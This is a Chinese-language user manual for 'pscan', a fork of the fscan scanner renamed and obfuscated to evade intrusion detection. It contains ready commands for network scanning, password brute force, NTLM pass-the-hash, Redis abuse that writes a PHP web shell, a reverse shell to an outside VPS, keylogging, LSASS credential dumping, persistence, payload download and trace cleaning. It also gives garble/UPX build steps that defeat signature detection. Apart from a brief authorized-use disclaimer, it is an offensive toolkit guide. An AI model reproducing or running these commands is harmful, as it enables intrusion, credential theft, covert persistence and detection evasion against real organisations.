# pscan 使用手册

> **文件**: `pscan.exe` (27.8 MB)
>
> 基于 [fscan](https://github.com/shadow1ng/fscan) v2.1.3-rc 修改的红队行动专用版本。针对红队场景进行了参数混淆与特征规避。
>
> **重要声明**: 本工具仅面向**合法授权**的企业安全建设行为。使用前请确保已获得授权，符合当地法律法规，**不对非授权目标扫描**。作者不承担任何非法使用产生的后果。

---

## 目录

- [简介](#简介)
- [魔改说明](#魔改说明)
- [与 fscan 的参数对照表](#与-fscan-的参数对照表)
- [完整参数表](#完整参数表)
- [使用场景与示例](#使用场景与示例)
  - [内网扫描](#内网扫描)
  - [端口与协议控制](#端口与协议控制)
  - [弱口令爆破](#弱口令爆破)
  - [Web 扫描](#web-扫描)
  - [POC 漏洞检测](#poc-漏洞检测)
  - [凭据复用与哈希传递](#凭据复用与哈希传递)
  - [后渗透利用](#后渗透利用)
  - [输出控制](#输出控制)
- [扫描模式](#扫描模式)
- [支持的爆破服务](#支持的爆破服务)
- [后渗透插件列表](#后渗透插件列表)
- [WebUI 模式](#webui-模式)
- [构建方法](#构建方法)
- [参考资料](#参考资料)

---

## 简介

pscan 是 fscan 的魔改版本，功能与 fscan 基本一致，但做了以下关键改动以规避 HIDS（主机入侵检测系统）和流量检测设备的特征识别。

**核心思路**：fscan 作为一个知名开源工具，其命令行参数名（如 `-h`、`-m`、`-user`、`-pwd`）、Banner（ASCII Logo）、二进制文件中的模块路径等都可能被安全产品提取为检测特征。pscan 通过全面混淆这些特征，使安全产品无法通过简单的字符串匹配识别出"这是 fscan 在扫描"。

---

## 魔改说明

| 修改项 | 说明 | 效果 |
|--------|------|------|
| **参数名全部混淆** | 所有命令行参数重命名（见下方对照表） | 规避基于参数名的特征检测（如 `-h`→`-t`） |
| **Banner 静默** | 启动时不输出 fscan ASCII Logo 和版本信息 | 不在终端和日志中留下"fscan"字样 |
| **模块名更改** | Go 模块路径改为 `test`，去除 `fscan` 名字特征 | 二进制文件中不包含 `github.com/shadow1ng/fscan` 路径字符串 |
| **源码字符串清理** | 代码中不出现 `fscan` 相关特征字符串 | strings 命令无法从二进制中提取到 fscan 相关文本 |
| **调试日志改名** | 调试日志文件名为 `tsk_debug.log` 而非 `fscan_debug.log` | 落盘日志不暴露工具名 |

---

## 与 fscan 的参数对照表

> **这是最重要的部分！** pscan 的参数名与 fscan 完全不同。如果你已经熟悉 fscan，请仔细阅读下表。

### 目标相关

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-h` | `-t` | 目标主机 (IP/CIDR/域名) |
| `-hf` | `-tf` | 主机列表文件 |
| `-eh` | `-et` | 排除主机 |
| `-ehf` | `-etf` | 排除主机文件 |

### 端口相关

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-p` | `-tp` | 端口列表 |
| `-pf` | `-tpf` | 端口列表文件 |
| `-ep` | `-etp` | 排除端口 |

### 扫描与性能

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-m` | `-st` | 扫描模式 |
| `-t` | `-tn` | 端口扫描线程数 |
| `-time` | `-tm` | 超时时间(秒) |
| `-mt` | `-mt` | 模块线程数（相同） |

### 凭据相关

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-user` | `-usr` | 用户名 |
| `-pwd` | `-pw` | 密码 |
| `-usera` | `-ua` | 额外用户名 |
| `-pwda` | `-pa` | 额外密码 |
| `-userf` | `-uf` | 用户名字典文件 |
| `-pwdf` | `-pf` | 密码字典文件 |
| `-upf` | `-up` | 用户名:密码对文件 |
| `-domain` | `-dm` | 域名 |
| `-sshkey` | `-sk` | SSH私钥 |
| `-hash` | `-hv` | 哈希值 |
| `-hashf` | `-hf` | 哈希文件 |

### Web 相关

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-u` | `-url` | 目标URL |
| `-uf` | `-urlf` | URL文件 |

### 输出相关

| fscan 参数 | pscan 参数 | 说明 |
|-----------|-----------|------|
| `-o` | `-out` | 输出文件 |
| `-f` | `-fmt` | 输出格式 |

### 未变化的参数

以下参数在 pscan 中保持不变：

`-ao`, `-np`, `-nobr`, `-nopoc`, `-noredis`, `-full`, `-silent`, `-no`, `-nocolor`, `-nopg`, `-debug`, `-perf`, `-lang`, `-dns`, `-cookie`, `-num`, `-retry`, `-rate`, `-maxpkts`, `-icmp-rate`, `-proxy`, `-socks5`, `-iface`, `-local`, `-gt`, `-ntp`, `-max-redirect`, `-wt`, `-rf`, `-rs`, `-rsh`, `-rwp`, `-rwc`, `-rwf`, `-sc`, `-fsh-port`, `-start-socks5`, `-persistence-file`, `-win-pe`, `-download-url`, `-download-path`, `-keylog-output`, `-log`, `-pocname`, `-pocpath`

---

## 完整参数表

### 目标参数

| 参数 | 类型 | 说明 |
|------|------|------|
| `-t` | string | 目标主机: IP, 网段(CIDR), 域名 (**必填**) |
| `-tf` | string | 主机列表文件 |
| `-tp` | string | 端口，默认约140个常用端口 |
| `-tpf` | string | 端口列表文件 |
| `-et` | string | 排除主机 |
| `-etf` | string | 排除主机文件 |
| `-etp` | string | 排除端口 |

### 扫描控制

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-st` | string | `all` | 扫描模式: all, icmp, portscan 或指定插件名 |
| `-ao` | — | — | 仅存活探测 |
| `-tn` | int | 600 | 端口扫描线程数 |
| `-mt` | int | 20 | 模块线程数 |
| `-tm` | int | 3 | 超时时间（秒） |
| `-gt` | int | 180 | 全局超时（秒） |
| `-np` | — | — | 禁用 Ping 探测 |
| `-ntp` | — | — | 禁用 TCP 补充探测 |
| `-rate` | int | 0(不限制) | 每分钟最大发包数 |
| `-maxpkts` | int | 0(不限制) | 最大发包总数 |
| `-icmp-rate` | float | 0.1 | ICMP 发包速率 |

### 凭据参数

| 参数 | 类型 | 说明 |
|------|------|------|
| `-usr` | string | 用户名 |
| `-pw` | string | 密码 |
| `-ua` | string | 额外用户名 (逗号或空格分隔) |
| `-pa` | string | 额外密码 (逗号或空格分隔) |
| `-uf` | string | 用户名字典文件 |
| `-pf` | string | 密码字典文件 |
| `-up` | string | 用户名:密码对文件 |
| `-dm` | string | 域名 |
| `-sk` | string | SSH 私钥文件 |
| `-hf` | string | 哈希文件 |
| `-hv` | string | 哈希值 |

### 功能开关

| 参数 | 说明 |
|------|------|
| `-nobr` | 禁用暴力破解 |
| `-nopoc` | 禁用 POC 扫描 |
| `-noredis` | 禁用 Redis 利用 |
| `-full` | 全量 POC 扫描 |
| `-pocpath` | POC 脚本路径 |
| `-pocname` | POC 名称 |
| `-num` | POC 并发数 (默认 20) |
| `-dns` | DNS 日志记录 |
| `-retry` | 爆破重试次数 (默认 3) |

### 后渗透参数

| 参数 | 类型 | 说明 |
|------|------|------|
| `-local` | string | 执行本地插件 (如: systeminfo, cleaner, reverseshell) |
| `-sc` | string | Shellcode 路径/URL |
| `-rsh` | string | 反弹 Shell 目标 (格式: ip:port) |
| `-start-socks5` | int | 启动 SOCKS5 代理端口 |
| `-fsh-port` | int | 正向 Shell 监听端口 (默认 4444) |
| `-persistence-file` | string | 持久化文件路径 |
| `-win-pe` | string | Windows PE 文件路径 |
| `-keylog-output` | string | 键盘记录输出文件 (默认 "keylog.txt") |
| `-download-url` | string | 文件下载 URL |
| `-download-path` | string | 文件下载保存路径 |

### Web 扫描

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-url` | string | — | Web 目标 URL |
| `-urlf` | string | — | URL 列表文件 |
| `-cookie` | string | — | HTTP Cookie |
| `-wt` | int | 5 | Web 请求超时（秒） |
| `-max-redirect` | int | 10 | 最大重定向次数 |

### Redis 利用

| 参数 | 类型 | 说明 |
|------|------|------|
| `-rf` | string | Redis 要写入的文件 |
| `-rs` | string | Redis SSH 公钥 |
| `-rwp` | string | Redis WebShell 写入路径 |
| `-rwc` | string | Redis WebShell 内容 |
| `-rwf` | string | Redis WebShell 文件名 |

### 代理/网络

| 参数 | 类型 | 说明 |
|------|------|------|
| `-proxy` | string | HTTP 代理 |
| `-socks5` | string | SOCKS5 代理 |
| `-iface` | string | 指定本地网卡 IP |

### 输出

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-out` | string | `result.txt` | 输出文件 |
| `-fmt` | string | `txt` | 输出格式: txt, json, csv |
| `-no` | — | — | 禁用保存到文件 |
| `-silent` | — | — | 静默模式 |
| `-nocolor` | — | — | 禁用颜色 |
| `-nopg` | — | — | 禁用进度条 |
| `-debug` | — | — | 调试模式 |
| `-log` | string | `base,info,success` | 日志级别 |
| `-perf` | — | — | 输出性能统计 JSON |

### 其他

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-lang` | string | `zh` | 语言: zh, en |
| `-help` | — | — | 显示帮助 |

---

## 使用场景与示例

### 内网扫描

```powershell
# 全量扫描整个 C 段（最常用）
.\pscan.exe -t 192.168.1.0/24

# 仅存活探测（快速定位在线主机）
.\pscan.exe -t 192.168.1.0/24 -ao

# ICMP 模式存活探测
.\pscan.exe -t 192.168.1.0/24 -st icmp

# 扫描多个网段
.\pscan.exe -t 192.168.1.0/24,10.10.0.0/16

# 扫描 IP 范围
.\pscan.exe -t 192.168.1.1-100

# 排除特定主机
.\pscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254

# 从文件读取目标列表
.\pscan.exe -tf targets.txt
```

### 端口与协议控制

```powershell
# 扫描指定端口
.\pscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379

# 扫描常用 Web 端口
.\pscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090

# 扫描全部端口（慢，谨慎使用，建议只对单台）
.\pscan.exe -t 192.168.1.100 -tp 1-65535 -tn 1000

# 排除特定端口
.\pscan.exe -t 192.168.1.0/24 -etp 445,139

# 跳过 Ping 探测（纯 TCP 扫描，适合禁 Ping 环境）
.\pscan.exe -t 192.168.1.0/24 -np

# 跳过 TCP 补充探测
.\pscan.exe -t 192.168.1.0/24 -ntp

# 调整扫描线程和超时（网络差时降低线程数）
.\pscan.exe -t 192.168.1.0/24 -tn 200 -tm 5

# 限制发包速率（规避流量检测）
.\pscan.exe -t 192.168.1.0/24 -rate 1000
```

### 弱口令爆破

```powershell
# 全量扫描 + 自动爆破（默认开启）
.\pscan.exe -t 192.168.1.0/24

# 禁用爆破（只扫端口和服务识别）
.\pscan.exe -t 192.168.1.0/24 -nobr

# 指定自定义凭据（注意是 -usr/-pw）
.\pscan.exe -t 192.168.1.0/24 -usr admin -pw admin123

# 使用字典文件
.\pscan.exe -t 192.168.1.0/24 -uf users.txt -pf pass.txt

# 使用用户名:密码对文件（每行 user:pass）
.\pscan.exe -t 192.168.1.0/24 -up creds.txt

# 添加额外用户/密码（与原字典合并）
.\pscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password

# 指定域名（用于域认证爆破）
.\pscan.exe -t 192.168.1.0/24 -dm corp.local

# SSH 私钥登录
.\pscan.exe -t 192.168.1.100 -sk id_rsa

# NTLM 哈希传递
.\pscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
```

### Web 扫描

```powershell
# 扫描单个 Web 站点
.\pscan.exe -url http://192.168.1.100:8080

# 扫描多个 URL（从文件读取）
.\pscan.exe -urlf urls.txt

# 带 Cookie 扫描
.\pscan.exe -url http://192.168.1.100 -cookie "PHPSESSID=xxx"

# 使用 HTTP 代理
.\pscan.exe -url http://192.168.1.100 -proxy http://127.0.0.1:8080

# 使用 SOCKS5 代理
.\pscan.exe -t 192.168.1.0/24 -socks5 127.0.0.1:1080

# 指定网卡（VPN 场景）
.\pscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
```

### POC 漏洞检测

```powershell
# 全量扫描 + POC 检测（默认开启）
.\pscan.exe -t 192.168.1.0/24

# 禁用 POC 扫描（加快速度）
.\pscan.exe -t 192.168.1.0/24 -nopoc

# 全量 POC 扫描（更全面但更慢）
.\pscan.exe -t 192.168.1.0/24 -full

# 指定 POC 名称
.\pscan.exe -t 192.168.1.100 -pocname thinkphp

# 自定义 POC 脚本目录
.\pscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/

# 调整 POC 并发数
.\pscan.exe -t 192.168.1.0/24 -num 10

# 启用 DNSLog
.\pscan.exe -t 192.168.1.0/24 -dns
```

### 凭据复用与哈希传递

```powershell
# NTLM 哈希传递
.\pscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"

# 哈希文件批量传递（注意 -hf 在 pscan 中是哈希文件，不是主机文件！）
.\pscan.exe -t 192.168.1.0/24 -hf hashes.txt

# 复用域用户凭据
.\pscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
```

### 后渗透利用

```powershell
# 列出所有可用本地插件
.\pscan.exe -local list

# 收集系统信息
.\pscan.exe -local systeminfo

# 反弹 Shell（先在外网 VPS 监听: nc -lvnp 4444）
.\pscan.exe -local reverseshell -rsh your-vps.com:4444

# 启动正向 Shell（等待目标连接）
.\pscan.exe -local forwardshell -fsh-port 4444

# 启动 SOCKS5 代理（本地监听 1080，用于内网穿透）
.\pscan.exe -local socks5proxy -start-socks5 1080

# Redis 写公钥（注意模式参数是 -st）
.\pscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."

# Redis 写 WebShell
.\pscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"

# 键盘记录
.\pscan.exe -local keylogger -keylog-output keylog.txt

# LSASS 凭证提取
.\pscan.exe -local minidump

# 杀软检测
.\pscan.exe -local avdetect

# Windows 持久化（启动项）
.\pscan.exe -local winstartup -win-pe C:\shell.exe

# 文件下载
.\pscan.exe -local download -download-url http://example.com/shell.exe -download-path C:\Users\Public\shell.exe

# 清理痕迹
.\pscan.exe -local cleaner
```

### 输出控制

```powershell
# 指定输出文件（注意是 -out 不是 -o）
.\pscan.exe -t 192.168.1.0/24 -out scan-result.txt

# JSON 格式输出
.\pscan.exe -t 192.168.1.0/24 -fmt json -out result.json

# CSV 格式输出
.\pscan.exe -t 192.168.1.0/24 -fmt csv -out result.csv

# 不保存文件，仅屏幕输出
.\pscan.exe -t 192.168.1.0/24 -no

# 静默模式（减少输出量，适合 C2 不出网场景）
.\pscan.exe -t 192.168.1.0/24 -silent

# 静默 + 不保存（最隐蔽）
.\pscan.exe -t 192.168.1.0/24 -silent -no

# 调试模式（详细日志写入 tsk_debug.log）
.\pscan.exe -t 192.168.1.0/24 -debug

# 输出性能统计
.\pscan.exe -t 192.168.1.0/24 -perf
```

---

## 扫描模式

通过 `-st` 参数指定扫描模式：

| 模式 | 说明 |
|------|------|
| `all` | 默认，存活探测 + 端口扫描 + 服务识别 + 弱口令爆破 + POC |
| `icmp` | 仅 ICMP 存活探测 |
| `portscan` | 仅端口扫描 |
| `redis` | 仅 Redis 扫描 + 利用 |
| `ssh` | 仅 SSH 扫描 + 爆破 |
| `mysql` | 仅 MySQL 扫描 + 爆破 |
| `mssql` | 仅 MSSQL 扫描 + 爆破 |
| `smb` | 仅 SMB 扫描 + MS17-010 |
| `rdp` | 仅 RDP 扫描 + 爆破 |
| … | 其他服务插件名均可作为模式 |

---

## 支持的爆破服务

| 服务 | 插件 | 默认端口 |
|------|------|----------|
| SSH | ssh | 22 |
| FTP | ftp | 21 |
| Telnet | telnet | 23 |
| SMB | smb | 445 |
| RDP | rdp | 3389 |
| VNC | vnc | 5900 |
| MySQL | mysql | 3306 |
| MSSQL | mssql | 1433 |
| Oracle | oracle | 1521 |
| PostgreSQL | postgresql | 5432 |
| Redis | redis | 6379 |
| MongoDB | mongodb | 27017 |
| Elasticsearch | elasticsearch | 9200 |
| Memcached | memcached | 11211 |
| LDAP | ldap | 389 |
| SMTP | smtp | 25 |
| POP3 | pop3 | 110 |
| IMAP | imap | 143 |
| SNMP | snmp | 161(UDP) |
| Rsync | rsync | 873 |
| RabbitMQ | rabbitmq | 5672 |
| ActiveMQ | activemq | 61616 |
| Kafka | kafka | 9092 |
| Zookeeper | zookeeper | 2181 |
| Neo4j | neo4j | 7687 |
| Cassandra | cassandra | 9042 |
| MQTT | mqtt | 1883 |
| Modbus | modbus | 502 |
| NetBIOS | netbios | 137-139 |
| JDWP | jdwp | 5005 |
| RMI | rmi | 1099 |
| NFS | nfs | 2049 |
| IPMI | ipmi | 623 |
| BACnet | bacnet | 47808 |

---

## 后渗透插件列表

通过 `-local` 参数调用：

| 插件名 | 功能 | 平台 |
|--------|------|------|
| `systeminfo` | 系统信息收集 | 全平台 |
| `reverseshell` | 反弹 Shell | 全平台 |
| `forwardshell` | 正向 Shell | Windows |
| `socks5proxy` | 启动 SOCKS5 代理 | 全平台 |
| `keylogger` | 键盘记录 | Windows |
| `minidump` | LSASS 凭据提取 | Windows |
| `sshkey` | SSH 公钥注入 | Linux |
| `cleaner` | 痕迹清理 | 全平台 |
| `crontask` | Cron 持久化 | Linux |
| `systemdservice` | Systemd 服务持久化 | Linux |
| `ldpreload` | LD_PRELOAD Rootkit | Linux |
| `winregistry` | 注册表持久化 | Windows |
| `winschtask` | 计划任务持久化 | Windows |
| `winservice` | 服务持久化 | Windows |
| `winstartup` | 启动项持久化 | Windows |
| `winlogon` | 登录脚本持久化 | Windows |
| `winwmi` | WMI 持久化 | Windows |
| `winbits` | BITS 任务持久化 | Windows |
| `winifeo` | IFEO 持久化 | Windows |
| `avdetect` | 杀软检测 | Windows |
| `download` | 文件下载 | 全平台 |

```powershell
# 列出所有本地插件
.\pscan.exe -local list

# 使用特定插件
.\pscan.exe -local systeminfo
```

---

## WebUI 模式

pscan 也内置了 Web 管理界面（需使用 web 版本编译，即 `pscan-web.exe`）：

```powershell
# 启动 Web 服务
.\pscan-web.exe

# 启动后访问 http://127.0.0.1:8080
```

WebUI 功能：图形化扫描任务管理、实时 WebSocket 结果推送、扫描预设保存、资产项目管理、多语言支持（中文/English）、深色模式。

---

## 构建方法

pscan 源码已去除 fscan 特征，构建时直接用 garble 混淆 + UPX 压缩：

```bash
# 标准版（garble 混淆构建）
garble -tiny -literals -seed=random build -ldflags="-s -w -buildid=" -trimpath -o pscan.exe .

# 精简版（不含后渗透模块）
garble -tiny -literals -seed=random build -tags nolocal -ldflags="-s -w -buildid=" -trimpath -o pscan-nolocal.exe .

# Web 版
garble -tiny -literals -seed=random build -tags web -ldflags="-s -w -buildid=" -trimpath -o pscan-web.exe .

# UPX 压缩（LZMA 算法，30MB → ~8-10MB）
upx --best --lzma pscan.exe -o pscan-upx.exe
```

**构建参数说明**：

| 参数 | 作用 |
|------|------|
| `-literals` | 混淆字符串/整数字面量 |
| `-tiny` | 剥离符号表、缩减 PE 段表 |
| `-seed=random` | 每次构建随机种子，生成不同混淆结果 |
| `-buildid=` | 清空 build ID，去除编译器指纹 |
| `--best --lzma` | 最高压缩率 + LZMA 算法，对 Go 二进制效果最好 |

---

## 参考资料

- [pscan GitHub 仓库](https://github.com/webzzaa/pscan)
- [pscan-loader 配合项目](https://github.com/webzzaa/pscan-loader-)
- [fscan GitHub 官方仓库](https://github.com/shadow1ng/fscan)

---

> **最后提醒**：本工具是专业安全评估工具，请在获得合法授权的前提下使用。禁止对未授权目标进行扫描，使用者需自行承担所有法律责任。
